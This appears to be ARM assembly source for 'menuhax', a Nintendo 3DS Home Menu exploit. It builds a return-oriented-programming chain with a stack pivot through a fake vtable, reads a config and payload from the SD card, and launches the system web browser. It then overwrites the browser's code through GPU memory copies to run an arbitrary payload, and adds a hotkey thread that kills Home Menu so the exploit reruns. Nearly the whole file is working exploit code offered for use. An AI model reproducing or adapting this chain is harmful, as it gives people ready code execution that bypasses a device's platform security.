.arm
.section .init
.global _start

//The addresses for the ROP-chain is from an include, see the Makefile gcc line with -include / README.

#include "menuhax_ropinclude.s"

_start:
.word POP_R2R6PC
ret2menu_exploitreturn_spaddr: @ The menuhax_loader writes the sp-addr to jump to for ret2menu here.
.word 0 @ r2
.word 0 @ r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

@ Stack-pivot to ropstackstart.
ROPMACRO_STACKPIVOT ROPBUFLOC(ropstackstart), ROP_POPPC

object:
.word ROPBUFLOC(vtable) @ object+0, vtable ptr
.word 0
.word 0
.word 0

.word ROPBUFLOC(object + 0x20) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
stackpivot_sploadword:
.word ROPBUFLOC(ropstackstart) @ sp
stackpivot_pcloadword:
.word ROP_POPPC @ pc

vtable:
.word 0, 0 @ vtable+0
.word 0
.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +16

tmpdata:

#ifndef ENABLE_LOADROPBIN
nss_outprocid:
.word 0

#if NEW3DS==0
#define PROGRAMIDLOW_SYSMODEL_BITMASK 0x0
#else
#define PROGRAMIDLOW_SYSMODEL_BITMASK 0x20000000
#endif

nsslaunchtitle_programidlow_list:
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ JPN
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00009402 @ USA
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00009D02 @ EUR
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ "AUS"(no 3DS systems actually have this region set)
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ CHN (the rest of the IDs here are probably wrong but whatever)
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ KOR
.word PROGRAMIDLOW_SYSMODEL_BITMASK | 0x00008802 @ TWN

/*nss_servname:
.ascii "ns:s"*/
#endif

#ifdef LOADSDPAYLOAD
IFile_ctx:
.space 0x20

#ifndef ENABLE_LOADROPBIN
sdfile_path:
.string16 "sd:/menuhax/menuhax_payload.bin"
.align 2
#else
sdfile_ropbin_path:
.string16 ROPBINPAYLOAD_PATH
.align 2
#endif
#endif

#ifdef LOADSDCFG
sdfile_cfg_path:
.string16 "sd:/menuhax/menuhax_cfg.bin"
.align 2
#endif

#ifdef ENABLE_IMAGEDISPLAY
#ifdef ENABLE_IMAGEDISPLAY_SD
sdfile_imagedisplay_path:
.string16 "sd:/menuhax/menuhax_imagedisplay.bin"
.align 2
#endif
#endif

#ifdef LOADSDCFG
menuhax_cfg:
.space 0x2c

menuhax_cfg_new:
.space 0x2c
#endif

ropkit_cmpobject:
.word (ROPBUFLOC(ropkit_cmpobject) + 0x4) @ Vtable-ptr
.fill (0x40 / 4), 4, STACKPIVOT_ADR @ Vtable

tmp_scratchdata:
.space 0x400

ropstackstart:
#ifdef LOADSDCFG
@ Load the cfg file. Errors are ignored with file-reading.
CALLFUNC_NOSP MEMSET32_OTHER, ROPBUFLOC(IFile_ctx), 0x20, 0, 0

CALLFUNC_NOSP IFile_Open, ROPBUFLOC(IFile_ctx), ROPBUFLOC(sdfile_cfg_path), 1, 0

CALLFUNC_NOSP IFile_Read,ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBUFLOC(menuhax_cfg), 0x2c

ROPMACRO_IFile_Close ROPBUFLOC(IFile_ctx)

@ Verify that the cfg version matches 0x3. On match continue running the below ROP, otherwise jump to rop_cfg_end. Mismatch can also be caused by file-reading failing.
ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x0), 0x3, ROPBUFLOC(rop_cfg_end)

@ Copy the u64 from filebuf+0x14 to the input values used with ropbin_svcsleepthread_macrostart.
ROPMACRO_COPYWORD ROPBUFLOC(ropbin_svcsleepthread_macrostart+CALLFUNC_R0R1_R0OFFSET), ROPBUFLOC(menuhax_cfg+0x14)
ROPMACRO_COPYWORD ROPBUFLOC(ropbin_svcsleepthread_macrostart+CALLFUNC_R0R1_R1OFFSET), ROPBUFLOC(menuhax_cfg+0x18)

@ Copy the u64 from filebuf+0x24 to newthread_svcsleepthread_delaylow/newthread_svcsleepthread_delayhigh.
ROPMACRO_COPYWORD ROPBUFLOC(newthread_svcsleepthread_macrostart+CALLFUNC_R0R1_R0OFFSET), ROPBUFLOC(menuhax_cfg+0x24)
ROPMACRO_COPYWORD ROPBUFLOC(newthread_svcsleepthread_macrostart+CALLFUNC_R0R1_R1OFFSET), ROPBUFLOC(menuhax_cfg+0x28)

rop_cfg_cmpbegin_exectypestart: @ Compare u32 filebuf+0x10(exec_type) with 0x0, on match continue to the ROP following this(which jumps to rop_cfg_cmpbegin1), otherwise jump to rop_cfg_cmpbegin_exectypeprepare.
ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x10), 0x0, ROPBUFLOC(rop_cfg_cmpbegin_exectypeprepare)
ROPMACRO_STACKPIVOT ROPBUFLOC(rop_cfg_cmpbegin1), ROP_POPPC

rop_cfg_cmpbegin_exectypeprepare:

CALLFUNC_NOSP MEMCPY, ROPBUFLOC(menuhax_cfg_new), ROPBUFLOC(menuhax_cfg), 0x2c, 0

@ Write 0x0 to cfg exec_type.
ROPMACRO_WRITEWORD ROPBUFLOC(menuhax_cfg_new+0x10), 0x0

@ Write the updated cfg to the file.

CALLFUNC_NOSP MEMSET32_OTHER, ROPBUFLOC(IFile_ctx), 0x20, 0, 0

CALLFUNC_NOSP IFile_Open, ROPBUFLOC(IFile_ctx), ROPBUFLOC(sdfile_cfg_path), 0x3, 0

CALLFUNC IFile_Write, ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBUFLOC(menuhax_cfg_new), 0x2c, 1, 0, 0, 0

ROPMACRO_IFile_Close ROPBUFLOC(IFile_ctx)

@ Compare u32 filebuf+0x10(exec_type) with 0x1, on match continue to the ROP following this, otherwise jump to rop_cfg_cmpbegin_exectype2.
ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x10), 0x1, ROPBUFLOC(rop_cfg_cmpbegin_exectype2)

@ Jump to padcheck_finish.
ROPMACRO_STACKPIVOT ROPBUFLOC(padcheck_finish), ROP_POPPC

rop_cfg_cmpbegin_exectype2: @ Compare u32 filebuf+0x10(exec_type) with 0x2, on match continue to the ROP following this, otherwise jump to rop_cfg_cmpbegin1.
ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x10), 0x2, ROPBUFLOC(rop_cfg_cmpbegin1)

ROPMACRO_STACKPIVOT ROPBUFLOC(ret2menu_rop), ROP_POPPC

rop_cfg_cmpbegin1: @ Compare u32 filebuf+0x4 with 0x1, on match continue to the ROP following this, otherwise jump to rop_cfg_cmpbegin2.
ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x4), 0x1, ROPBUFLOC(rop_cfg_cmpbegin2)

@ Copy the u32 from filebuf+0x8 to the cmpword at padcheck_cmpmacrostart.
ROPMACRO_COPYWORD ROPBUFLOC(padcheck_cmpmacrostart+ROPMACRO_CMPDATA_CMPWORD_OFFSET), ROPBUFLOC(menuhax_cfg+0x8)

@ This ROP chunk has finished, jump to rop_cfg_end.
ROPMACRO_STACKPIVOT ROPBUFLOC(rop_cfg_end), ROP_POPPC

rop_cfg_cmpbegin2: @ Compare u32 filebuf+0x4 with 0x2, on match continue to the ROP following this, otherwise jump to rop_cfg_end.
ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x4), 0x2, ROPBUFLOC(rop_cfg_end)

@ This type is the same as type1(minus the offset the PAD value is loaded from), except that the padcheck is inverted: on PAD match ret2menu, on mismatch continue ROP.

@ Copy the u32 from filebuf+0xc to the cmpword at padcheck_cmpmacrostart.
ROPMACRO_COPYWORD ROPBUFLOC(padcheck_cmpmacrostart+ROPMACRO_CMPDATA_CMPWORD_OFFSET), ROPBUFLOC(menuhax_cfg+0xc)

rop_cfg_end:
#endif

padcheck_cmpmacrostart:
@ Compare current PAD state with 0x200(L-button). On match continue running the below ROP(padcheck_match), otherwise jump to padcheck_mismatch. This padval can be overwritten by the above ROP.
ROPMACRO_CMPDATA 0x1000001c, 0x200, ROPBUFLOC(padcheck_mismatch)

padcheck_match:
@ Compare u32 filebuf+0x4 with 0x2, on match jump to ret2menu_rop, otherwise jump to padcheck_finish.
ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x4), 0x2, ROPBUFLOC(padcheck_finish)
ROPMACRO_STACKPIVOT ROPBUFLOC(ret2menu_rop), ROP_POPPC

padcheck_mismatch:
@ Compare u32 filebuf+0x4 with 0x2, on match jump to padcheck_finish, otherwise jump to ret2menu_rop.
ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x4), 0x2, ROPBUFLOC(ret2menu_rop)
ROPMACRO_STACKPIVOT ROPBUFLOC(padcheck_finish), ROP_POPPC

ret2menu_rop:

#ifdef LOADSDCFG
@ When u32 cfg+0x20 != 0x0, goto to ret2menu_rop_createthread, otherwise jump to ret2menu_rop_returnmenu.
ROPMACRO_CMPDATA ROPBUFLOC(menuhax_cfg+0x20), 0x0, ROPBUFLOC(ret2menu_rop_createthread)
ROPMACRO_STACKPIVOT ROPBUFLOC(ret2menu_rop_returnmenu), ROP_POPPC

ret2menu_rop_createthread:

@ Copy the u32 from cfg+0x20 to the cmpword for newthread_rop_r1data_cmphid.
ROPMACRO_COPYWORD ROPBUFLOC(newthread_rop_cmphidstart+ROPMACRO_CMPDATA_CMPWORD_OFFSET), ROPBUFLOC(menuhax_cfg+0x20)

CALLFUNC svcControlMemory, ROPBUFLOC(tmp_scratchdata), NEWTHREAD_ROPBUFFER, 0, (((newthread_ropend - newthread_ropstart) + 0xfff) & ~0xfff), 0x3, 0x3, 0, 0

CALLFUNC_NOSP MEMCPY, NEWTHREAD_ROPBUFFER, ROPBUFLOC(newthread_ropstart), (newthread_ropend - newthread_ropstart), 0

@ svcCreateThread(<tmp_scratchdata addr>, ROP_POPPC, 0, NEWTHREAD_ROPBUFFER, 28, -2);

CALLFUNC svcCreateThread, ROPBUFLOC(tmp_scratchdata), ROP_POPPC, 0, NEWTHREAD_ROPBUFFER, 45, -2, 0, 0
#endif

ret2menu_rop_returnmenu:

@ Pivot to the sp-addr from ret2menu_exploitreturn_spaddr.

ROPMACRO_COPYWORD ROPBUFLOC(stackpivot_sploadword), ROPBUFLOC(ret2menu_exploitreturn_spaddr)

ROPMACRO_WRITEWORD ROPBUFLOC(stackpivot_pcloadword), ROP_POPPC

ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP
ROPMACRO_STACKPIVOT_JUMP

padcheck_finish:

//Overwrite the top-screen framebuffers. First chunk is 3D-left framebuffer, second one is 3D-right(when that's enabled). These are the primary framebuffers. Color format is byte-swapped RGB8.
#ifndef ENABLE_IMAGEDISPLAY
CALL_GXCMD4 0x1f000000, 0x1f1e6000, 0x46800*2
#else

@ Allocate the buffer containing the gfx data in linearmem, with the bufptr located @ tmp_scratchdata+4, which is then copied to tmp_scratchdata+8.
CALLFUNC svcControlMemory, ROPBUFLOC(tmp_scratchdata+4), 0, 0, (((0x46800*2 + 0x38800) + 0xfff) & ~0xfff), 0x10003, 0x3, 0, 0
ROPMACRO_COPYWORD ROPBUFLOC(tmp_scratchdata+8), ROPBUFLOC(tmp_scratchdata+4)

@ Initialize the data which will be copied into the framebuffers, for when reading the file fails.

@ Clear the entire buffer, including the sub-screen data just to make sure it's all-zero initially.
CALLFUNC_NOSP_LDRR0 MEMSET32_OTHER, ROPBUFLOC(tmp_scratchdata+8), ((0x46800*2) + 0x38800), 0, 0

CALLFUNC_NOSP_LDRR0 MEMCPY, ROPBUFLOC(tmp_scratchdata+8), 0x1f000000, (0x46800*2), 0

#ifdef ENABLE_IMAGEDISPLAY_SD
CALLFUNC_NOSP MEMSET32_OTHER, ROPBUFLOC(IFile_ctx), 0x20, 0, 0

CALLFUNC_NOSP IFile_Open, ROPBUFLOC(IFile_ctx), ROPBUFLOC(sdfile_imagedisplay_path), 1, 0

@ Read main-screen 3D-left image.
CALLFUNC_NOSP_LOADR2 IFile_Read, ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBUFLOC(tmp_scratchdata+8), (0x46500)

@ Read main-screen 3D-right image.
ROPMACRO_LDDRR0_ADDR1_STRADDR ROPBUFLOC(tmp_scratchdata+8), ROPBUFLOC(tmp_scratchdata+8), 0x46800
CALLFUNC_NOSP_LOADR2 IFile_Read, ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBUFLOC(tmp_scratchdata+8), (0x46500)

@ Read sub-screen image.
ROPMACRO_LDDRR0_ADDR1_STRADDR ROPBUFLOC(tmp_scratchdata+8), ROPBUFLOC(tmp_scratchdata+8), 0x46800
CALLFUNC_NOSP_LOADR2 IFile_Read, ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBUFLOC(tmp_scratchdata+8), (0x38400)

ROPMACRO_IFile_Close ROPBUFLOC(IFile_ctx)
#endif

@ Setup the framebuffers to make sure they're at the intended addrs(like when returning from another title etc).
@ Setup primary framebuffers for the main-screen.
CALLFUNC GSP_SHAREDMEM_SETUPFRAMEBUF, 0, 0, 0x1f1e6000, 0x1f1e6000 + 0x46800, 0x2d0, 0x321, 0, 0
@ Setup secondary framebuffers for the main-screen.
CALLFUNC GSP_SHAREDMEM_SETUPFRAMEBUF, 0, 1, 0x1f273000, 0x1f273000 + 0x46800, 0x2d0, 0x321, 1, 0

@ Setup primary framebuffers for the sub-screen.
CALLFUNC GSP_SHAREDMEM_SETUPFRAMEBUF, 1, 0, 0x1f48f000, 0, 0x2d0, 0x301, 0, 0
@ Setup secondary framebuffers for the sub-screen.
CALLFUNC GSP_SHAREDMEM_SETUPFRAMEBUF, 1, 1, 0x1f48f000 + 0x38800, 0, 0x2d0, 0x301, 1, 0


@ Flush gfx dcache.
CALLFUNC_NOSP_LDRR0 GSPGPU_FlushDataCache, ROPBUFLOC(tmp_scratchdata+4), (0x46800*2) + 0x38800, 0, 0

ROPMACRO_COPYWORD ROPBUFLOC(tmp_scratchdata+8), ROPBUFLOC(tmp_scratchdata+4)

@ Copy the gfx to the primary/secondary main-screen framebuffers.
CALL_GXCMD4_LDRSRC ROPBUFLOC(tmp_scratchdata+8), 0x1f1e6000, 0x46800*2
CALL_GXCMD4_LDRSRC ROPBUFLOC(tmp_scratchdata+8), 0x1f273000, 0x46800*2

@ Copy the gfx to the primary/secondary sub-screen framebuffers.
ROPMACRO_LDDRR0_ADDR1_STRADDR ROPBUFLOC(tmp_scratchdata+8), ROPBUFLOC(tmp_scratchdata+8), 0x46800*2

CALL_GXCMD4_LDRSRC ROPBUFLOC(tmp_scratchdata+8), 0x1f48f000, 0x38800
CALL_GXCMD4_LDRSRC ROPBUFLOC(tmp_scratchdata+8), 0x1f48f000 + 0x38800, 0x38800

@ Wait 0.1s for the above transfers to finish, then free the allocated linearmem buffer.

CALLFUNC_R0R1 svcSleepThread, 100000000, 0

CALLFUNC_LDRR1 svcControlMemory, ROPBUFLOC(tmp_scratchdata+12), ROPBUFLOC(tmp_scratchdata+4), 0, (((0x46800*2 + 0x38800) + 0xfff) & ~0xfff), 0x1, 0x0, 0, 0
#endif

#ifdef ENABLE_LOADROPBIN
#ifndef LOADSDPAYLOAD
CALLFUNC_NOSP MEMCPY, ROPBIN_BUFADR, ROPBUFLOC(codebinpayload_start), (codedataend-codebinpayload_start), 0
#else
CALLFUNC_NOSP MEMSET32_OTHER, ROPBUFLOC(IFile_ctx), 0x20, 0, 0

CALLFUNC_NOSP IFile_Open, ROPBUFLOC(IFile_ctx), ROPBUFLOC(sdfile_ropbin_path), 1, 0
COND_THROWFATALERR

CALLFUNC_NOSP IFile_Read, ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBIN_BUFADR, 0x10000
COND_THROWFATALERR

ROPMACRO_IFile_Close ROPBUFLOC(IFile_ctx)
#endif

CALLFUNC_NOSP MEMSET32_OTHER, ROPBIN_BUFADR - (0x800*6), 0x2800, 0, 0 @ paramblk, the additional 0x2000-bytes is for backwards-compatibility.

CALLFUNC_NOSP GSPGPU_FlushDataCache, ROPBIN_BUFADR - (0x800*6), (0x10000+0x2800), 0, 0

@ Delay 3-seconds. This seems to help with the *hax 2.5 payload booting issues which triggered in some cases(doesn't happen as much with this).

ropbin_svcsleepthread_macrostart:
CALLFUNC_R0R1 svcSleepThread, 3000000000, 0

ROPMACRO_STACKPIVOT ROPBIN_BUFADR, ROP_POPPC
#endif

#ifndef ENABLE_LOADROPBIN

#if NEW3DS==1 //On New3DS the end-address of the GPU-accessible FCRAM area increased, relative to the SYSTEM-memregion end address. Therefore, in order to get the below process to run under memory that's GPU accessible, 0x400000-bytes are allocated here.
CALLFUNC svcControlMemory, ROPBUFLOC(tmp_scratchdata), 0x0f000000, 0, 0x00400000, 0x3, 0x3, 0, 0
#endif

#ifdef LOADSDPAYLOAD//When enabled, load the file from SD to codebinpayload_start.
CALLFUNC_NOSP MEMSET32_OTHER, ROPBUFLOC(IFile_ctx), 0x20, 0, 0

CALLFUNC_NOSP IFile_Open, ROPBUFLOC(IFile_ctx), ROPBUFLOC(sdfile_path), 1, 0
COND_THROWFATALERR

CALLFUNC_NOSP IFile_Read, ROPBUFLOC(IFile_ctx), ROPBUFLOC(tmp_scratchdata), ROPBUFLOC(codebinpayload_start), (CODEBINPAYLOAD_SIZE - (codebinpayload_start - codedatastart))
COND_THROWFATALERR

ROPMACRO_IFile_Close ROPBUFLOC(IFile_ctx)
#endif

CALLFUNC_NOSP GSPGPU_FlushDataCache, ROPBUFLOC(codedatastart), CODEBINPAYLOAD_SIZE, 0, 0

ROP_SETLR POP_R2R6PC

ROP_SETR0 ROPBUFLOC(region_outval)

.word CFGIPC_SecureInfoGetRegion @ Write the SecureInfo region value to the below field which will be popped into r4.

.word 0 @ r2
.word 0 @ r3
region_outval:
.word 0 @ r4
.word ROPBUFLOC(nsslaunchtitle_programidlow_list) @ r5
.word 0 @ r6

ROP_SETR0 ROPBUFLOC(object)

.word ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX //"ldr r1, [r5, r4, lsl #2]" <call vtable funcptr +20 from the r0 object> (load the programID-low for this region into r1)

ROP_SETLR_OTHER ROP_POPPC

ROP_SETR0 ROPBUFLOC(nsslaunchtitle_regload_programidlow)

.word ROP_STR_R1TOR0 //Write the programID-low value for this region to the below reg-data which would be used for the programID-low in the NSS_LaunchTitle call.

ROP_SETLR POP_R2R6PC

ROP_SETR0 ROPBUFLOC(onss_outprocidbject) @ out procid*

@ r1 isn't used by NSS_LaunchTitle so no need to set it here.

.word POP_R2R6PC
nsslaunchtitle_regload_programidlow:
.word 0 @ r2, programID low (overwritten by the above ROP)
.word 0x00040030 @ r3, programID high
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

.word NSS_LaunchTitle @ Launch the web-browser.

.word 0 @ r2 / sp0 (mediatype, 0=NAND)
.word 0 @ r3
.word 0 @ r4
.word 0 @ r5
.word 0 @ r6

#if NEW3DS==1//Use this as a waitbyloop.
CALLFUNC ROP_INITOBJARRAY, 0, ROP_BXLR, 0, 0x10000000, 0, 0, 0, 0
#endif

//Overwrite the browser .text with the below code.
CALL_GXCMD4 ROPBUFLOC(codedatastart), NSS_PROCLOADTEXT_LINEARMEMADR, CODEBINPAYLOAD_SIZE

/*#if NEW3DS==1 //Free the memory which was allocated above on new3ds.
CALLFUNC svcControlMemory, ROPBUFLOC(tmp_scratchdata), 0x0f000000, 0, 0x00400000, 0x1, 0x0, 0, 0
#endif*/

#if NEW3DS==1//Use this as a waitbyloop.
CALLFUNC ROP_INITOBJARRAY, 0, ROP_BXLR, 0, 0x10000000, 0, 0, 0, 0
#endif

@ Sleep 1 second, call GSPGPU_Shutdown() etc, then execute svcSleepThread in an "infinite loop". The ARM11-kernel does not allow this homemenu thread and the browser thread to run at the same time(homemenu thread has priority over the browser thread). Therefore an "infinite loop" like the bx one below will result in execution of the browser thread completely stopping once any homemenu "infinite loop" begin execution. On Old3DS this means the below code will overwrite .text while the browser is attempting to clear .bss. On New3DS since overwriting .text+0 doesn't quite work(context-switching doesn't trigger at the right times), a different location in .text has to be overwritten instead.

CALLFUNC_R0R1 svcSleepThread, 1000000000, 0

CALLFUNC_NOARGS GSPGPU_Shutdown

/*
//Get "ns:s" service handle, then send it via APT_SendParameter(). The codebin payload can then use APT:ReceiveParameter to get this "ns:s" handle.
CALLFUNC_NOSP SRV_GETSERVICEHANDLE, ROPBUFLOC(aptsendparam_handle), ROPBUFLOC(nss_servname), 0x4, 0

CALLFUNC APT_SendParameter, 0x101, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0*/

ropfinish_sleepthread:
#ifdef EXITMENU
ROP_SETLR ROP_POPPC

#if NEW3DS==0
CALLFUNC_R0R1 svcSleepThread, 4000000000, 0 @ Sleep 4 seconds.
#else
CALLFUNC_R0R1 svcSleepThread, 3000000000, 0 @ Sleep 3 seconds.
#endif

.word MAINLR_SVCEXITPROCESS
#endif

CALLFUNC_R0R1 svcSleepThread, 1000000000, 0

ROPMACRO_STACKPIVOT ROPBUFLOC(ropfinish_sleepthread), ROP_POPPC

ROP_SETR1 ROP_BXR1

.word ROP_BXR1 @ This is used as an infinite loop.

.word 0x58584148
#endif

#ifdef LOADSDCFG
newthread_ropstart:

@ Sleep 5-seconds.
newthread_svcsleepthread_macrostart:
CALLFUNC_R0R1 svcSleepThread, 0x2A05F200, 0x1

@ Compare the gspgpu session handle with 0x0. On match continue running the below ROP which then jumps to newthread_ropstart, otherwise jump to newthread_rop_cmphidstart. Hence, this will only continue to checking the HID state when the gspgpu handle is non-zero(this is intended as a <is-homemenu-active> check, but this passes with *hax payload already running too).
ROPMACRO_CMPDATA_NEWTHREAD GSPGPU_SERVHANDLEADR, 0x0, (NEWTHREAD_ROPBUFFER + (newthread_rop_cmphidstart - newthread_ropstart))
ROPMACRO_STACKPIVOT_NEWTHREAD NEWTHREAD_ROPBUFFER, ROP_POPPC

newthread_rop_cmphidstart:
@ Compare current PAD state with <value loaded from cfg from above ROP>. On match continue running the below ROP, otherwise jump to newthread_ropstart.
ROPMACRO_CMPDATA_NEWTHREAD 0x1000001c, 0, NEWTHREAD_ROPBUFFER

@ Read the cfg from FS again just in case it changed since menuhax initially ran.

CALLFUNC_NOSP MEMSET32_OTHER, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), 0x20, 0, 0

CALLFUNC_NOSP IFile_Open, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_sdfile_cfg_path - newthread_ropstart)), 1, 0

CALLFUNC_NOSP IFile_Read, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_tmp_scratchdata - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_menuhax_cfg - newthread_ropstart)), 0x2c

ROPMACRO_IFile_Close (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart))

@ Verify that the cfg version matches 0x3. On match continue running the below ROP, otherwise jump to newthread_ropstart. Mismatch can also be caused by file-reading failing.
ROPMACRO_CMPDATA_NEWTHREAD (NEWTHREAD_ROPBUFFER + ((newthread_menuhax_cfg+0x0) - newthread_ropstart)), 0x3, (NEWTHREAD_ROPBUFFER)

@ Write 0x1 to cfg exec_type.
ROPMACRO_WRITEWORD (NEWTHREAD_ROPBUFFER + ((newthread_menuhax_cfg+0x10) - newthread_ropstart)), 0x1

CALLFUNC_NOSP MEMSET32_OTHER, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), 0x20, 0, 0

CALLFUNC_NOSP IFile_Open, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_sdfile_cfg_path - newthread_ropstart)), 0x3, 0

CALLFUNC IFile_Write, (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_tmp_scratchdata - newthread_ropstart)), (NEWTHREAD_ROPBUFFER + (newthread_menuhax_cfg - newthread_ropstart)), 0x2c, 1, 0, 0, 0

ROPMACRO_IFile_Close (NEWTHREAD_ROPBUFFER + (newthread_IFile_ctx - newthread_ropstart))

.word MAINLR_SVCEXITPROCESS @ Cause homemenu to terminate, which then results in menuhax automatically launching during homemenu startup.

newthread_object:
.word NEWTHREAD_ROPBUFFER + (newthread_vtable - newthread_ropstart) @ object+0, vtable ptr
.word NEWTHREAD_ROPBUFFER + (newthread_object - newthread_ropstart) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
.word 0
.word 0

.word NEWTHREAD_ROPBUFFER + ((newthread_object + 0x20) - newthread_ropstart) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((newthread_object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
newthread_rop_stackpivot_sploadword:
.word NEWTHREAD_ROPBUFFER @ sp
newthread_rop_stackpivot_pcloadword:
.word ROP_POPPC @ pc

.space ((newthread_object + 0x28) - .)
.word NEWTHREAD_ROPBUFFER + (newthread_object - newthread_ropstart) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.

newthread_vtable:
.word 0, 0 @ vtable+0
.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
.word ROP_POPPC, ROP_POPPC @ vtable funcptr +16/+20

newthread_ropkit_cmpobject:
.word (NEWTHREAD_ROPBUFFER + (newthread_ropkit_cmpobject + 0x4 - newthread_ropstart)) @ Vtable-ptr
.fill (0x40 / 4), 4, STACKPIVOT_ADR @ Vtable

newthread_menuhax_cfg:
.space 0x2c

newthread_IFile_ctx:
.space 0x20

newthread_sdfile_cfg_path:
.string16 "sd:/menuhax/menuhax_cfg.bin"
.align 2

newthread_tmp_scratchdata:
.space 0x400

newthread_ropend:
.word 0
#endif

#ifndef ENABLE_LOADROPBIN
.align 4
codedatastart:
#if NEW3DS==0
.space 0x200 @ nop-sled
#else
#if (((REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)) && REGIONVAL!=4)
.space 0x1000
#else
.space 0x3000 @ Size >=0x2000 is needed for SKATER >=v9.6(0x3000 for SKATER system-version v9.9), but doesn't work with the initial version of SKATER for whatever reason.
#endif
#endif

#if NEW3DS==0
ldr r0, =3000000000
mov r1, #0
svc 0x0a @ Sleep 3 seconds.
#else
/*ldr r0, =3000000000
mov r1, #0
svc 0x0a @ Sleep 3 seconds.*/
/*ldr r0, =0x540BE400
mov r1, #2
svc 0x0a @ Sleep 10 seconds, so that hopefully the payload doesn't interfere with sysmodule loading.*/
#endif

ldr r0, =0x10003 @ operation
mov r4, #3 @ permissions

mov r1, #0 @ addr0
mov r2, #0 @ addr1
ldr r3, =0xc000 @ size
svc 0x01 @ Allocate 0xc000-bytes of linearmem.
mov r4, r1
cmp r0, #0
bne codecrash

mov r1, #0x49
str r1, [r4, #0x48] @ flags
ldr r1, =0x101
str r1, [r4, #0x5c] @ NS appID (use the homemenu appID since the browser appID wouldn't be registered yet)
mov r0, r4
adr r1, codecrash
mov lr, r1
#ifdef PAYLOADENABLED
b codebinpayload_start
#else
b codecrash
#endif
.pool

codecrash:
ldr r3, =0x58584148
ldr r3, [r3]
code_end:
b code_end
.pool

.align 4
codebinpayload_start:
#ifdef CODEBINPAYLOAD
.incbin CODEBINPAYLOAD
#endif

.align 4
codedataend:
.word 0
#endif

.align 4
_end:

